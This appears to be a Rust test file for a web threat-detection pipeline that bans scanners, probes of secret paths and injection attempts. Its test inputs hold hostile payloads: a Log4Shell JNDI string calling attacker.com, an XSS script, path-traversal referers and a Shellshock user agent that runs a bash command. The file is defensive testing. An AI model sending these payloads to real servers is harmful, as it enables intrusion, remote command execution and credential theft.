use sanalu::geo::IpMetadata;
use sanalu::intelligence::{BotCategory, PipelineAction, ThreatPipeline};
use std::collections::HashSet;
use std::net::IpAddr;

#[test]
fn test_scanner_on_allowed_endpoint_is_still_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let action = pipeline.evaluate(
        "203.0.113.10".parse().unwrap(),
        None,
        "zgrab/0.x (compatible; Research)",
        "GET",
        "/api/health",
    );
    match action {
        PipelineAction::Ban { reason, .. } => {
            assert_eq!(reason, "blocked_bot_category:security_testing");
        }
        _ => panic!("Scanner on allowed endpoint must be banned at Stage 2!"),
    }
}

#[test]
fn test_clean_user_agent_on_allowed_endpoint_is_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let action = pipeline.evaluate(
        "203.0.113.10".parse().unwrap(),
        None,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "GET",
        "/api/health",
    );
    assert!(matches!(action, PipelineAction::Allow));
}

#[test]
fn test_clean_user_agent_on_exploit_path_is_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let action = pipeline.evaluate(
        "203.0.113.10".parse().unwrap(),
        None,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "GET",
        "/%00",
    );
    match action {
        PipelineAction::Ban { reason, permanent } => {
            assert_eq!(reason, "probe:common:immediate_malicious");
            assert!(!permanent);
        }
        _ => panic!("Clean browser hitting %00 must be banned!"),
    }
}

#[test]
fn test_banned_ip_dropped_immediately() {
    let mut banned_ips = HashSet::new();
    let ip: IpAddr = "198.51.100.77".parse().unwrap();
    banned_ips.insert(ip);

    let pipeline = ThreatPipeline::new(
        HashSet::new(),
        banned_ips,
        HashSet::new(),
        HashSet::new(),
        HashSet::new(),
        HashSet::new(),
        &[],
    )
    .unwrap();

    let action = pipeline.evaluate(ip, None, "Mozilla/5.0", "GET", "/");
    assert_eq!(action, PipelineAction::DropBanned);
}

#[test]
fn test_whitelist_bypasses_all_subsequent_stages() {
    let mut whitelisted_ips = HashSet::new();
    let ip: IpAddr = "192.0.2.100".parse().unwrap();
    whitelisted_ips.insert(ip);

    let pipeline = ThreatPipeline::new(
        whitelisted_ips,
        HashSet::new(),
        HashSet::new(),
        HashSet::new(),
        HashSet::new(),
        HashSet::new(),
        &[],
    )
    .unwrap();

    let action = pipeline.evaluate(ip, None, "zgrab/0.x", "GET", "/.env");
    assert_eq!(action, PipelineAction::Allow);
}

#[test]
fn test_stage1_asn_policy() {
    let mut blocked_asns = HashSet::new();
    blocked_asns.insert(9009);

    let mut restricted_asns = HashSet::new();
    restricted_asns.insert(16509);

    let mut allowed_regions = HashSet::new();
    allowed_regions.insert("US".into());
    allowed_regions.insert("SG".into());

    let mut blocked_categories = HashSet::new();
    blocked_categories.insert(BotCategory::SecurityTesting);

    let pipeline = ThreatPipeline::new(
        HashSet::new(),
        HashSet::new(),
        blocked_asns,
        restricted_asns,
        allowed_regions,
        blocked_categories,
        &[],
    )
    .unwrap();

    let ip: IpAddr = "198.51.100.1".parse().unwrap();

    let meta_blocked = IpMetadata {
        asn: 9009,
        country: *b"RU",
        as_org: "BAD_ASN".into(),
    };
    let action_blocked = pipeline.evaluate(ip, Some(&meta_blocked), "Mozilla/5.0", "GET", "/");
    assert_eq!(
        action_blocked,
        PipelineAction::Ban {
            reason: "blocked_asn:9009".into(),
            permanent: false,
        }
    );

    let meta_restricted_disallowed = IpMetadata {
        asn: 16509,
        country: *b"RU",
        as_org: "AMAZON".into(),
    };
    let action_disallowed = pipeline.evaluate(
        ip,
        Some(&meta_restricted_disallowed),
        "Mozilla/5.0",
        "GET",
        "/",
    );
    assert_eq!(
        action_disallowed,
        PipelineAction::Ban {
            reason: "restricted_asn_region:16509:RU".into(),
            permanent: false,
        }
    );

    let meta_restricted_allowed = IpMetadata {
        asn: 16509,
        country: *b"US",
        as_org: "AMAZON".into(),
    };
    let action_allowed = pipeline.evaluate(
        ip,
        Some(&meta_restricted_allowed),
        "Mozilla/5.0",
        "GET",
        "/",
    );
    assert_eq!(action_allowed, PipelineAction::Allow);
}

#[test]
fn test_loopback_and_private_ips_automatically_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let loopback_v4: IpAddr = "127.0.0.1".parse().unwrap();
    let loopback_v6: IpAddr = "::1".parse().unwrap();
    let private_10: IpAddr = "10.0.1.50".parse().unwrap();
    let private_172: IpAddr = "172.16.5.10".parse().unwrap();
    let private_192: IpAddr = "192.168.1.100".parse().unwrap();
    let cgnat: IpAddr = "100.64.0.1".parse().unwrap();

    for ip in [
        loopback_v4,
        loopback_v6,
        private_10,
        private_172,
        private_192,
        cgnat,
    ] {
        let action =
            pipeline.evaluate(ip, None, "zgrab/0.x (compatible; Research)", "GET", "/.env");
        assert_eq!(action, PipelineAction::Allow);
    }
}

#[test]
fn test_threat_pipeline_builds_from_store() {
    let temp_dir = tempfile::tempdir().unwrap();
    let db_path = temp_dir.path().join("pipeline_store.redb");
    let store = sanalu::storage::RedbStore::open(&db_path).unwrap();

    let mut cfg = sanalu::config::AppConfig::default();
    cfg.general.whitelist = vec!["198.51.100.5".into()];
    cfg.asn_rules.blocked_asns = vec![13335];
    store.sync_from_config(&cfg).unwrap();

    let pipeline = sanalu::engine::build_pipeline_from_config(&cfg, &store).unwrap();

    let action = pipeline.evaluate(
        "198.51.100.5".parse().unwrap(),
        None,
        "Mozilla/5.0",
        "GET",
        "/",
    );
    assert_eq!(action, sanalu::intelligence::PipelineAction::Allow);

    let meta = sanalu::geo::IpMetadata {
        asn: 13335,
        country: *b"US",
        as_org: "CLOUDFLARE".into(),
    };
    let blocked_action = pipeline.evaluate(
        "198.51.100.99".parse().unwrap(),
        Some(&meta),
        "Mozilla/5.0",
        "GET",
        "/",
    );
    assert!(matches!(
        blocked_action,
        sanalu::intelligence::PipelineAction::Ban { .. }
    ));

    store.set_asn_restricted(64496, true).unwrap();
    let direct_pipeline = sanalu::engine::build_pipeline_from_store(&store, &[]).unwrap();
    let restricted_meta = sanalu::geo::IpMetadata {
        asn: 64496,
        country: *b"CN",
        as_org: "RESTRICTED".into(),
    };
    let restricted_action = direct_pipeline.evaluate(
        "198.51.100.99".parse().unwrap(),
        Some(&restricted_meta),
        "Mozilla/5.0",
        "GET",
        "/",
    );
    assert!(matches!(
        restricted_action,
        sanalu::intelligence::PipelineAction::Ban { .. }
    ));
}

#[test]
fn test_probe_with_status_code_filtering() {
    let pipeline = ThreatPipeline::new_test_instance();

    let action_404 = pipeline.evaluate_request(
        "203.0.113.10".parse().unwrap(),
        None,
        "Mozilla/5.0",
        "GET",
        "/.aws/credentials",
        404,
        "",
    );
    assert!(matches!(action_404, PipelineAction::Ban { .. }));

    let action_200 = pipeline.evaluate_request(
        "203.0.113.10".parse().unwrap(),
        None,
        "Mozilla/5.0",
        "GET",
        "/.well-known/acme-challenge/test",
        200,
        "",
    );
    assert!(matches!(action_200, PipelineAction::Allow));
}

#[test]
fn test_scanner_methods_are_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let scanner_methods = ["PROPFIND", "DEBUG", "SEARCH", "TRACK", "TRACE"];
    for method in scanner_methods {
        let action = pipeline.evaluate_request(
            "203.0.113.15".parse().unwrap(),
            None,
            "Mozilla/5.0",
            method,
            "/",
            200,
            "",
        );
        match action {
            PipelineAction::Ban { reason, permanent } => {
                assert!(reason.starts_with("scanner_method:"));
                assert!(!permanent);
            }
            _ => panic!("scanner method must be banned"),
        }
    }

    let safe_action = pipeline.evaluate_request(
        "203.0.113.15".parse().unwrap(),
        None,
        "Mozilla/5.0",
        "GET",
        "/",
        200,
        "",
    );
    assert_eq!(safe_action, PipelineAction::Allow);
}

#[test]
fn test_referer_injection_attacks_are_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let malicious_referers = [
        "${jndi:ldap://attacker.com/exploit}",
        "<script>alert(1)</script>",
        "https://example.com/../../etc/passwd",
        "https://example.com/..\\..\\windows\\system32",
    ];

    for referer in malicious_referers {
        let action = pipeline.evaluate_request(
            "203.0.113.20".parse().unwrap(),
            None,
            "Mozilla/5.0",
            "GET",
            "/",
            200,
            referer,
        );
        match action {
            PipelineAction::Ban { reason, permanent } => {
                assert!(reason.starts_with("harmful_referer:"));
                assert!(permanent);
            }
            _ => panic!("referer injection must be banned"),
        }
    }

    let benign_action = pipeline.evaluate_request(
        "203.0.113.20".parse().unwrap(),
        None,
        "Mozilla/5.0",
        "GET",
        "/",
        200,
        "https://www.google.com/search?q=rust",
    );
    assert_eq!(benign_action, PipelineAction::Allow);
}

#[test]
fn test_immediate_malicious_uris_are_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.30".parse().unwrap();

    let action_null =
        pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/test%00", 200, "");
    assert_eq!(
        action_null,
        PipelineAction::Ban {
            reason: "probe:common:immediate_malicious".into(),
            permanent: false,
        }
    );

    let action_crlf =
        pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/path%0d%0a", 200, "");
    assert_eq!(
        action_crlf,
        PipelineAction::Ban {
            reason: "probe:common:immediate_malicious".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_shared_strikes_accumulate_across_probes_and_ban_on_threshold() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.40".parse().unwrap();

    let act1 = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/wp-login.php", 404, "");
    assert_eq!(act1, PipelineAction::Allow);

    let act2 = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/.env", 404, "");
    assert_eq!(act2, PipelineAction::Allow);

    let act3 = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/.env", 404, "");
    assert_eq!(
        act3,
        PipelineAction::Ban {
            reason: "probe:common:shared_threshold:3".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_isolated_strikes_do_not_taint_shared_pool() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.50".parse().unwrap();

    for _ in 0..4 {
        let act = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/backup.sql", 404, "");
        assert_eq!(act, PipelineAction::Allow);
    }

    let act_shared = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/.env", 404, "");
    assert_eq!(act_shared, PipelineAction::Allow);

    let act5_iso =
        pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/backup.sql", 404, "");
    assert_eq!(
        act5_iso,
        PipelineAction::Ban {
            reason: "probe:backups:isolated_threshold:5".into(),
            permanent: false,
        }
    );
}

#[test]
fn test_normal_request_200_is_allowed() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.60".parse().unwrap();

    let act = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/index.html", 200, "");
    assert_eq!(act, PipelineAction::Allow);

    let act_env = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/.env", 200, "");
    assert_eq!(act_env, PipelineAction::Allow);
}

#[test]
fn test_cleanup_stale_strikes() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.70".parse().unwrap();

    let act = pipeline.evaluate_request(ip, None, "Mozilla/5.0", "GET", "/.env", 404, "");
    assert_eq!(act, PipelineAction::Allow);

    let now_secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    pipeline.cleanup_stale_strikes(now_secs + 100, 10);
}

#[test]
fn test_user_agent_header_exploit_is_permanently_banned() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.80".parse().unwrap();
    let act = pipeline.evaluate_request(
        ip,
        None,
        "Mozilla/5.0 () { :; }; /bin/bash -c 'reboot'",
        "GET",
        "/",
        200,
        "",
    );
    assert_eq!(
        act,
        PipelineAction::Ban {
            reason: "header_exploit:shellshock".into(),
            permanent: true,
        }
    );
}

#[test]
fn test_generic_tools_context_aware_probe_banning() {
    let pipeline = ThreatPipeline::new_test_instance();
    let ip: IpAddr = "203.0.113.81".parse().unwrap();
    let act_ok = pipeline.evaluate_request(ip, None, "curl/7.68.0", "GET", "/health", 200, "");
    assert_eq!(act_ok, PipelineAction::Allow);

    let act_probe = pipeline.evaluate_request(ip, None, "curl/7.68.0", "GET", "/.env", 404, "");
    assert_eq!(
        act_probe,
        PipelineAction::Ban {
            reason: "probe:generic_tools:tool_probe".into(),
            permanent: false,
        }
    );
}
